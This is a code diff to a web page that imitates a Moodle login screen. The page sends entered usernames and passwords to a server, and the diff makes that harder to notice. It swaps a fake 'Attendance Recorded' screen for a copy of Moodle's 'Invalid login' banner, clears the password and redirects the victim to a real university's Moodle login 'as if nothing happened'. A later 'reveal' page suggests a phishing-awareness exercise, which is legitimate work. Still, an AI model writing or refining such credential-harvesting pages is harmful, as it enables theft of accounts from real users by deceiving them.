@@ -154,53 +154,22 @@
             margin-right: 4px;
         }
 
-        /* ===== SUCCESS PAGE ===== */
-        .success-wrapper {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .success-card {
-            background: #fff;
-            padding: 48px 32px;
+        /* ===== ERROR BANNER (exact Moodle computed styles) ===== */
+        .login-error {
+            display: none;
+            background-color: rgb(244, 214, 210);
+            color: rgb(105, 25, 17);
+            padding: 12px 20px;
+            margin-bottom: 16px;
             border-radius: 8px;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
-            width: 100%;
-            max-width: 528px;
-            text-align: center;
-        }
-
-        .success-check {
-            width: 80px;
-            height: 80px;
-            background: #198754;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 40px;
-            color: white;
-        }
-
-        .success-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #198754;
-            margin-bottom: 8px;
-        }
-
-        .success-subtitle {
             font-size: 15px;
-            color: #666;
-            line-height: 1.6;
+            font-weight: 400;
+            line-height: 22.5px;
+            text-align: left;
         }
 
-        .success-name {
-            font-weight: 600;
-            color: #1d2125;
+        .login-error.active {
+            display: block;
         }
 
         /* ===== REVEAL PAGE ===== */
@@ -304,39 +273,6 @@
         .action-box { background: #cfe2ff; border: 2px solid #0d6efd; text-align: center; }
         .action-box p { color: #084298; font-size: 14px; font-weight: 600; }
 
-        /* ===== LOADING ===== */
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(255, 255, 255, 0.9);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-
-        .loading-overlay.active { display: flex; }
-
-        .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #e0e0e0;
-            border-top-color: #0f47ad;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        .loading-text {
-            margin-top: 16px;
-            font-size: 16px;
-            color: #333;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
@@ -349,6 +285,8 @@
                     <img id="logoimage" src="logo.png" class="img-fluid" alt="Learning Management System">
                     <h1 class="login-heading">Log in to Learning Management System</h1>
                 </div>
+
+                <div class="login-error" id="loginError">Invalid login, please try again</div>
 
                 <form id="loginForm" onsubmit="return handleLogin(event)">
                     <div class="form-group">
@@ -374,22 +312,7 @@
         </div>
     </div>
 
-    <!-- PHASE 2: FAKE SUCCESS -->
-    <div class="page" id="successPage">
-        <div class="success-wrapper">
-            <div class="success-card">
-                <div class="success-check">&#10003;</div>
-                <div class="success-title">Attendance Recorded</div>
-                <div class="success-subtitle">
-                    Welcome, <span class="success-name" id="successName"></span><br>
-                    Your attendance has been confirmed.<br>
-                    You may close this page.
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- PHASE 3: REVEAL (on return visit) -->
+    <!-- PHASE 2: REVEAL (on return visit) -->
     <div class="page" id="revealPage">
         <div class="reveal-wrapper">
             <div class="reveal-card">
@@ -428,12 +351,6 @@
                 </div>
             </div>
         </div>
-    </div>
-
-    <!-- LOADING SPINNER -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="spinner"></div>
-        <div class="loading-text">Logging in...</div>
     </div>
 
     <script>
@@ -480,14 +397,14 @@
                 body: JSON.stringify({ username: username, password: password })
             }).catch(function() {});
 
-            // Show loading spinner
-            document.getElementById('loadingOverlay').classList.add('active');
+            // Show "Invalid login" error (matches real Moodle exactly)
+            document.getElementById('loginError').classList.add('active');
+            document.getElementById('password').value = '';
 
+            // Redirect to real Moodle after 3 seconds (as if nothing happened)
             setTimeout(function() {
-                document.getElementById('loadingOverlay').classList.remove('active');
-                document.getElementById('successName').textContent = username;
-                showPage('successPage');
-            }, 2000);
+                window.location.href = 'https://lms.apiu.edu/login/index.php';
+            }, 3000);
 
             return false;
         }
